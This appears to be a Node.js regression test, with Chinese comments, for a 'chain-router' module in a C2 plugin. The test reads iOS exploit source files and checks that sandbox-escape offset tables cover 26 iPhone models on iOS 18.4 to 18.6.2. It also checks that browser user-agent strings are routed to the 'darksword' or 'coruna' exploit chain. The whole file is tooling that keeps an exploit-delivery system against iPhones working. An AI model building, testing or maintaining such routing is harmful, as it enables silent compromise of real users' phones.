/**
 * chain-router.js 版本矩阵断言测试 —— 直接读取**真实源文件**并解析，
 * 不使用任何人工枚举常量，确保结论可复现。
 *
 * 运行：
 *   E:\CTF\runtime\node\node.exe _integration\_fix_work\test_chain_router.mjs
 *
 * ★★ I1-C1 修复（P-3）：import 目标已由**源目录**改为**产物**。
 *   原为 `../build/services/chain-router.js`（源侧原型），
 *   对 `E:\USDT项目` 的产物**零覆盖** —— 即"把源目录的成绩记成产物的成绩"（P-1 形态）。
 *   现指向产物，本脚本才可作为**产物门禁**使用。
 *   ★ 若需再测源侧原型，请另建 `test_chain_router_prototype.mjs`，
 *     且**不得**把它当作产物回归（见 P-3）。
 *
 * 覆盖：
 *   ① sbx0_offsets 运行时合并后 = 156 键 / 26 机型 / 6 build
 *   ② linkedit_to_device 的 156 个返回值与 sbx0_offsets 键**精确双射**
 *   ③ 6 个 build 每个都能在 sbx0_offsets 中命中（逐个机型）
 *   ④ DARKSWORD_VERSION_BUILDS 的取值集合 == sbx0 实际覆盖 build 集合
 *   ⑤ 修正后 darkswordStageReach 对 18.4 / 18.4.1 / 18.5 / 18.6 / 18.6.1 / 18.6.2 均 full
 *   ⑥ coruna 上界论证不受影响（19/13/5 条目，PSNMWj max=170000）
 *   ⑦ pickChain 端到端抽样
 */

import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  CHAINS, DARKSWORD_VERSION_BUILDS, SBX0_COVERED_BUILDS,
  darkswordStageReach, pickChain, parseIosVersion, isIphone, moduleBelongsToChain,
} from 'file:///E:/USDT项目/02-backend-node/src_restored/plugins/c2/services/chain-router.js';

// ★ 自证：打印实际加载的模块路径，防止"改了不生效"的静默假绿
console.log('[I1-C1] chain-router 加载自: E:/USDT项目/02-backend-node/src_restored/plugins/c2/services/chain-router.js');
console.log(`[I1-C1] 导出校验: CHAINS=${typeof CHAINS} pickChain=${typeof pickChain} SBX0_COVERED_BUILDS.size=${SBX0_COVERED_BUILDS?.size ?? 'n/a'}`);


const DARKSWORD = 'E:\\ios漏洞\\ios15-17版本漏洞\\ios15-17版本漏洞\\darksword';
const SBX0 = path.join(DARKSWORD, 'sbx0_main_18.4.js');
const RCE  = path.join(DARKSWORD, 'rce_module.js');
const CORUNA = 'E:\\ios漏洞\\ios15-17版本漏洞\\ios15-17版本漏洞\\coruna\\platform_module.js';

let pass = 0, fail = 0;
const failures = [];
function ok(cond, label, detail) {
  if (cond) { pass++; }
  else { fail++; failures.push(label + (detail ? ' :: ' + detail : '')); }
}
function eq(a, b, label) { ok(a === b, label, `expected=${JSON.stringify(b)} actual=${JSON.stringify(a)}`); }

/** 从源码中截取 `name = {` 起的花括号平衡对象体 */
function balanced(src, startIdx, open = '{', close = '}') {
  let depth = 0, started = false;
  for (let j = startIdx; j < src.length; j++) {
    if (src[j] === open) { depth++; started = true; }
    else if (src[j] === close) { depth--; if (started && depth === 0) return src.slice(startIdx, j + 1); }
  }
  throw new Error('unbalanced object starting at ' + startIdx);
}

// ---------------------------------------------------------------- 解析 sbx0
const sbx0Src = fs.readFileSync(SBX0, 'utf8');
const sbx0Keys = new Set();

// L28：字面量赋值
{
  const m = /sbx0_offsets\s*=\s*\{/.exec(sbx0Src);
  const body = balanced(sbx0Src, sbx0Src.indexOf('{', m.index));
  for (const k of body.matchAll(/"([^"]+)"\s*:\s*\{/g)) sbx0Keys.add(k[1]);
  console.log(`[parse] L28 字面量       -> ${sbx0Keys.size} 键`);
}
// 后续每次 Object.assign 合并
{
  let n = 0;
  for (const m of sbx0Src.matchAll(/sbx0_offsets\s*=\s*Object\.assign\(sbx0_offsets\s*,\s*\{/g)) {
    const body = balanced(sbx0Src, sbx0Src.indexOf('{', m.index + m[0].length - 1));
    const before = sbx0Keys.size;
    for (const k of body.matchAll(/"([^"]+)"\s*:\s*\{/g)) sbx0Keys.add(k[1]);
    n++;
    const line = sbx0Src.slice(0, m.index).split('\n').length;
    console.log(`[parse] L${line} Object.assign#${n} -> +${sbx0Keys.size - before} 键`);
  }
  eq(n, 2, 'sbx0_offsets 恰好有 2 次 Object.assign 合并');
}

const sbx0Devices = new Set([...sbx0Keys].map(k => k.split('_')[0]));
const sbx0Builds  = new Set([...sbx0Keys].map(k => k.split('_').pop()));

eq(sbx0Keys.size, 156, 'sbx0_offsets 运行时唯一键数 = 156');
eq(sbx0Devices.size, 26, 'sbx0_offsets 机型数 = 26');
eq(sbx0Builds.size, 6, 'sbx0_offsets build 数 = 6');
eq([...sbx0Builds].sort().join(','),
   [...['22E240', '22E252', '22F76', '22G86', '22G90', '22G100']].sort().join(','),
   'sbx0_offsets 覆盖的 6 个 build 与预期一致');

// 每个 build 都恰好 26 机型
for (const b of sbx0Builds) {
  const c = [...sbx0Keys].filter(k => k.endsWith('_' + b)).length;
  eq(c, 26, `build ${b} 覆盖 26 机型`);
}

// ------------------------------------------------- 解析 linkedit_to_device
const rceSrc = fs.readFileSync(RCE, 'utf8');
const lm = /const linkedit_to_device\s*=\s*\{/.exec(rceSrc);
const lBody = balanced(rceSrc, rceSrc.indexOf('{', lm.index));
const lt2dValues = new Set([...lBody.matchAll(/"([^"]*iPhone[^"]*)"/g)].map(m => m[1]));

eq(lt2dValues.size, 156, 'linkedit_to_device 返回值数 = 156');

// ② 精确双射
const onlyInLt2d = [...lt2dValues].filter(v => !sbx0Keys.has(v));
const onlyInSbx0 = [...sbx0Keys].filter(k => !lt2dValues.has(k));
eq(onlyInLt2d.length, 0, 'linkedit_to_device 中不在 sbx0_offsets 的值 = 0');
eq(onlyInSbx0.length, 0, 'sbx0_offsets 中不被 linkedit_to_device 产出的键 = 0');

// ③ 每个 build 的每个机型都能命中
let hitMiss = 0, hitTotal = 0;
for (const v of lt2dValues) { hitTotal++; if (!sbx0Keys.has(v)) hitMiss++; }
eq(hitMiss, 0, `查表模拟：${hitTotal} 次查找 0 次 miss`);

// ④ 映射集合 == 实际覆盖集合
const mapped = Object.values(DARKSWORD_VERSION_BUILDS);
eq(new Set(mapped).size, 6, 'DARKSWORD_VERSION_BUILDS 含 6 个不同 build');
for (const b of mapped) ok(sbx0Builds.has(b), `映射 build ${b} 在 sbx0 实际覆盖内`);
eq(SBX0_COVERED_BUILDS.length, 6, 'SBX0_COVERED_BUILDS 已由映射推导为 6 项');
eq([...SBX0_COVERED_BUILDS].sort().join(','), [...sbx0Builds].sort().join(','),
   'SBX0_COVERED_BUILDS 与源文件实际覆盖完全一致');

// ⑤ 每个版本键都 full
const versionCases = [
  [[18, 4, 0], '22E240', 'full'],
  [[18, 4, 1], '22E252', 'full'],
  [[18, 5, 0], '22F76', 'full'],
  [[18, 6, 0], '22G86', 'full'],
  [[18, 6, 1], '22G90', 'full'],
  [[18, 6, 2], '22G100', 'full'],
];
for (const [v, build, reach] of versionCases) {
  const r = darkswordStageReach(v);
  eq(r.build, build, `darkswordStageReach(${v.join('.')}).build`);
  eq(r.reach, reach, `darkswordStageReach(${v.join('.')}).reach`);
}

// partialFrom 已移除
ok(!('partialFrom' in CHAINS.darksword), 'CHAINS.darksword 已无 partialFrom');
ok(CHAINS.darksword.max.join('.') === '18.6.2', 'CHAINS.darksword.max = 18.6.2');

// ⑥ coruna 未受影响
const corunaSrc = fs.readFileSync(CORUNA, 'utf8');
function corunaTable(name) {
  const m = new RegExp(name + '\\s*[:=]\\s*\\[').exec(corunaSrc);
  let depth = 0, started = false;
  for (let j = corunaSrc.indexOf('[', m.index); j < corunaSrc.length; j++) {
    if (corunaSrc[j] === '[') { depth++; started = true; }
    else if (corunaSrc[j] === ']') { depth--; if (started && depth === 0) return corunaSrc.slice(corunaSrc.indexOf('[', m.index), j + 1); }
  }
}
const tPS = corunaTable('PSNMWj'), tLT = corunaTable('LTgSl5'), tRO = corunaTable('RoAZdq');
const vers = t => [...t.matchAll(/GFx77t:\s*(\d+)/g)].map(x => +x[1]);
const pv = vers(tPS), lv = vers(tLT), rv = vers(tRO);
eq(pv.length, 19, 'PSNMWj 条目数 = 19');
eq(Math.max(...pv), 170000, 'PSNMWj 最高 minVersion = 170000');
eq(lv.length, 13, 'LTgSl5 条目数 = 13');
eq(Math.max(...lv), 170300, 'LTgSl5 最高 minVersion = 170300');
eq(rv.length, 5, 'RoAZdq 条目数 = 5');
eq(Math.max(...rv), 150000, 'RoAZdq 最高 minVersion = 150000');
eq(CHAINS.coruna.max.join('.'), '17.2.1', 'coruna 上界保持 17.2.1（未改动）');

// ⑦ 端到端
const ua5 = 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15';
const r5 = pickChain(ua5);
eq(r5.chain, 'darksword', 'iOS 18.5 -> darksword');
eq(r5.build, '22F76', 'iOS 18.5 -> build 22F76');
eq(r5.partial, false, 'iOS 18.5 partial = false（修正后不再 prefix-only）');

const ua62 = 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_6_2 like Mac OS X) AppleWebKit/605.1.15';
eq(pickChain(ua62).build, '22G100', 'iOS 18.6.2 -> 22G100');
eq(pickChain(ua62).partial, false, 'iOS 18.6.2 partial = false');

eq(pickChain('Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)').chain, 'coruna', 'iOS 17.0 -> coruna');
eq(pickChain('Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X)'), null, 'iOS 17.3 -> null');
eq(pickChain('Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X)'), null, 'iOS 18.3 -> null');
eq(pickChain('Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X)'), null, 'iOS 18.7 -> null');
eq(pickChain('Mozilla/5.0 (iPad; CPU OS 18_5 like Mac OS X)'), null, 'iPad -> null');
eq(isIphone(ua5), true, 'isIphone(UA) = true');
eq(parseIosVersion(ua5).join('.'), '18.5.0', 'parseIosVersion 18_5 -> 18.5.0');
eq(moduleBelongsToChain('ds_sbx0_x', 'darksword'), true, 'ds_ 前缀归类 darksword');
eq(moduleBelongsToChain('Stage1_a', 'coruna'), true, 'Stage1_ 前缀归类 coruna');

// ---------------------------------------------------------------- 汇总
console.log('');
console.log('='.repeat(60));
console.log(`断言结果: 通过 ${pass} / 失败 ${fail}  (共 ${pass + fail})`);
if (fail) {
  console.log('--- 失败明细 ---');
  for (const f of failures) console.log('  ✗ ' + f);
  process.exit(1);
} else {
  console.log('✓ 全部通过');
}
